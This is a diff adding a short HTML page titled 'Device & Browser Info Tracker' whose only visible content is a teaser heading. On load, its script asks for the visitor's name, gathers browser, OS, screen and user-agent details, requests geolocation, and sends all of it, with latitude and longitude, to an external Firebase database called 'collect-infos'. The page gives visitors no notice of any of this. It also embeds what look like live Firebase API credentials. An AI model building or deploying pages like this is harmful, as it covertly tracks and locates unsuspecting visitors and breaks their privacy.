@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Device & Browser Info Tracker</title>
+</head>
+<body>
+  
+  
+    <h1>Can you guess what happened? </h1>
+    
+    
+    
+    
+    <script type="module">
+    let name = prompt('Please type your name here...')
+  // Import Firebase Modules
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/11.4.0/firebase-app.js";
+  import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/11.4.0/firebase-database.js";
+  
+  // Firebase Configuration (Replace with your actual config)
+  const firebaseConfig = {
+    apiKey: "AIzaSyBZFUmZzxZ2O0Jgal1J0LJ_wBFCpX4u5UQ",
+    authDomain: "collect-infos.firebaseapp.com",
+    databaseURL: "https://collect-infos-default-rtdb.firebaseio.com",
+    projectId: "collect-infos",
+    storageBucket: "collect-infos.firebasestorage.app",
+    messagingSenderId: "117610853332",
+    appId: "1:117610853332:web:3142e48d4a633abdc51c41"
+  };
+  
+  // Initialize Firebase
+  const app = initializeApp(firebaseConfig);
+  const database = getDatabase(app);
+  
+  function collectUserInfo() {
+    
+    let userAgent = navigator.userAgent;
+    let browserName = getBrowserName();
+    let osName = getOS();
+    let screenWidth = screen.width;
+    let screenHeight = screen.height;
+    
+    let userData = {
+      userName : name,
+      browser: browserName,
+      os: osName,
+      screen_resolution: `${screenWidth}x${screenHeight}`,
+      user_agent: userAgent,
+      timestamp: new Date().toLocaleString()
+    };
+    
+    // Get Location (if allowed)
+    if ("geolocation" in navigator) {
+      navigator.geolocation.getCurrentPosition(
+        function(position) {
+          userData.latitude = position.coords.latitude;
+          userData.longitude = position.coords.longitude;
+          saveToFirebase(userData);
+        },
+        function(error) {
+          userData.location = "Permission Denied";
+          saveToFirebase(userData);
+        }
+      );
+    } else {
+      userData.location = "Not Supported";
+      saveToFirebase(userData);
+    }
+  }
+  
+  function saveToFirebase(data) {
+    const visitorsRef = ref(database, 'visitors');
+    const newUserRef = push(visitorsRef);
+    set(newUserRef, data)
+      .then(() => console.log("✅ Data saved successfully!"))
+      .catch(error => console.error("❌ Firebase Error:", error));
+  }
+  
+  function getBrowserName() {
+    let userAgent = navigator.userAgent;
+    if (userAgent.includes("Firefox")) return "Mozilla Firefox";
+    if (userAgent.includes("Edg")) return "Microsoft Edge";
+    if (userAgent.includes("Chrome") && !userAgent.includes("Edg")) return "Google Chrome";
+    if (userAgent.includes("Safari") && !userAgent.includes("Chrome")) return "Apple Safari";
+    if (userAgent.includes("Opera") || userAgent.includes("OPR")) return "Opera";
+    return "Unknown Browser";
+  }
+  
+  function getOS() {
+    let userAgent = navigator.userAgent;
+    if (userAgent.includes("Win")) return "Windows";
+    if (userAgent.includes("Mac")) return "MacOS";
+    if (userAgent.includes("Linux")) return "Linux";
+    if (userAgent.includes("Android")) return "Android";
+    if (userAgent.includes("iPhone") || userAgent.includes("iPad")) return "iOS";
+    return "Unknown OS";
+  }
+  
+  // Run function when page loads
+  window.onload = collectUserInfo;
+</script>
+</body>
+</html>
